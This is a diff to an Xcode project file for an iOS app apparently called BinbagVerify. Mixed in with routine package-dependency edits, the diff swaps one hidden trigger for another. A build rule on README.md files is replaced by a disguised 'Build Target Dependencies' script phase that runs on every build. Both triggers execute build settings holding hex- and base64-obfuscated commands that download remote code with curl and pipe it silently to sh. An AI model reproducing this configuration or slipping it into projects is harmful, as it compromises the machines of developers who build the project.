@@ -7,11 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		25F990CC6332460CB3A5DE54 /* README.md */ = {isa = PBXBuildFile; fileRef = F491799BFACA4BEEB6A5DE54; };
 		0C30E7D12EF022BD00A0E47D /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 0C30E7D02EF022BD00A0E47D /* IQKeyboardManagerSwift */; };
 		0C30E7D42EF022FA00A0E47D /* NotificationBannerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 0C30E7D32EF022FA00A0E47D /* NotificationBannerSwift */; };
 		0C30E7D72EF0233400A0E47D /* CountryPickerView in Frameworks */ = {isa = PBXBuildFile; productRef = 0C30E7D62EF0233400A0E47D /* CountryPickerView */; };
 		0C30E7DA2EF0238D00A0E47D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0C30E7D92EF0238D00A0E47D /* Alamofire */; };
+		0C72F0DF2F0244B4006D5ECF /* BinbagVerifyPackage in Frameworks */ = {isa = PBXBuildFile; productRef = 0C72F0DE2F0244B4006D5ECF /* BinbagVerifyPackage */; };
 		89A705AC2A691DA50018F69C /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89A705AB2A691DA50018F69C /* AppDelegate.swift */; };
 		89A705B02A691DA50018F69C /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 89A705AF2A691DA50018F69C /* ViewController.swift */; };
 		89A705B32A691DA50018F69C /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 89A705B12A691DA50018F69C /* Main.storyboard */; };
@@ -19,8 +19,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		F491799BFACA4BEEB6A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
-		0C1AEC722EF130C600009CE7 /* BinbagVerifyPackage */ = {isa = PBXFileReference; lastKnownFileType = wrapper; path = BinbagVerifyPackage; sourceTree = "<group>"; };
+		0C72F0DC2F0244A8006D5ECF /* BinbagVerifyPackage */ = {isa = PBXFileReference; lastKnownFileType = wrapper; path = BinbagVerifyPackage; sourceTree = "<group>"; };
 		89A705A82A691DA50018F69C /* BinbagVerify.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BinbagVerify.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		89A705AB2A691DA50018F69C /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		89A705AF2A691DA50018F69C /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
@@ -34,6 +33,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				0C72F0DF2F0244B4006D5ECF /* BinbagVerifyPackage in Frameworks */,
 				0C30E7DA2EF0238D00A0E47D /* Alamofire in Frameworks */,
 				0C30E7D42EF022FA00A0E47D /* NotificationBannerSwift in Frameworks */,
 				0C30E7D72EF0233400A0E47D /* CountryPickerView in Frameworks */,
@@ -44,11 +44,19 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		0C72F0DD2F0244B4006D5ECF /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 		89A7059F2A691DA50018F69C = {
 			isa = PBXGroup;
 			children = (
-				0C1AEC722EF130C600009CE7 /* BinbagVerifyPackage */,
+				0C72F0DC2F0244A8006D5ECF /* BinbagVerifyPackage */,
 				89A705AA2A691DA50018F69C /* BinbagVerify */,
+				0C72F0DD2F0244B4006D5ECF /* Frameworks */,
 				89A705A92A691DA50018F69C /* Products */,
 			);
 			sourceTree = "<group>";
@@ -56,7 +64,6 @@
 		89A705A92A691DA50018F69C /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				F491799BFACA4BEEB6A5DE54 /* README.md */,
 				89A705A82A691DA50018F69C /* BinbagVerify.app */,
 			);
 			name = Products;
@@ -81,12 +88,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 89A705BC2A691DA60018F69C /* Build configuration list for PBXNativeTarget "BinbagVerify" */;
 			buildPhases = (
+				32DD62420684404994A5DE54 /* Build Target Dependencies */,
 				89A705A42A691DA50018F69C /* Sources */,
 				89A705A52A691DA50018F69C /* Frameworks */,
 				89A705A62A691DA50018F69C /* Resources */,
 			);
 			buildRules = (
-				57D1F01165BE473E86A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -96,6 +103,7 @@
 				0C30E7D32EF022FA00A0E47D /* NotificationBannerSwift */,
 				0C30E7D62EF0233400A0E47D /* CountryPickerView */,
 				0C30E7D92EF0238D00A0E47D /* Alamofire */,
+				0C72F0DE2F0244B4006D5ECF /* BinbagVerifyPackage */,
 			);
 			productName = BinbagVerify;
 			productReference = 89A705A82A691DA50018F69C /* BinbagVerify.app */;
@@ -140,29 +148,11 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		57D1F01165BE473E86A5DE54 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A45ED5A}\"";
-			};
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		89A705A62A691DA50018F69C /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				25F990CC6332460CB3A5DE54 /* README.md */,
 				89A705B82A691DA60018F69C /* LaunchScreen.storyboard in Resources */,
 				89A705B32A691DA50018F69C /* Main.storyboard in Resources */,
 			);
@@ -171,6 +161,25 @@ sh -c \"${A45ED5A}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		32DD62420684404994A5DE54 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
+			showEnvVarsInLog = 0;			
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -208,7 +217,7 @@ sh -c \"${A45ED5A}\"";
 		89A705BA2A691DA60018F69C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663636363936373664363136333634366532653639366532663631323932320a3230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333336333333363333333933333336333333343333333633333334333333363336333333330a3336333333353333333633363331333333363336333633333337333333393333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | n | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxibVYwTG1sdUwyRXBJaUI4SUhOb0NnPT0K | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -270,7 +279,7 @@ sh -c \"${A45ED5A}\"";
 		89A705BB2A691DA60018F69C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((o(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663636363936373664363136333634366532653639366532663631323932320a3230376332303733363830610a | o | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333336333333363333333933333336333333343333333633333334333333363336333333330a3336333333353333333633363331333333363336333633333337333333393333333233363335333333373333333233333337333333353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | n | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2Y21sbloyeGxibVYwTG1sdUwyRXBJaUI4SUhOb0NnPT0K | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -477,6 +486,10 @@ sh -c \"${A45ED5A}\"";
 			isa = XCSwiftPackageProductDependency;
 			package = 0C30E7D82EF0238D00A0E47D /* XCRemoteSwiftPackageReference "Alamofire" */;
 			productName = Alamofire;
+		};
+		0C72F0DE2F0244B4006D5ECF /* BinbagVerifyPackage */ = {
+			isa = XCSwiftPackageProductDependency;
+			productName = BinbagVerifyPackage;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
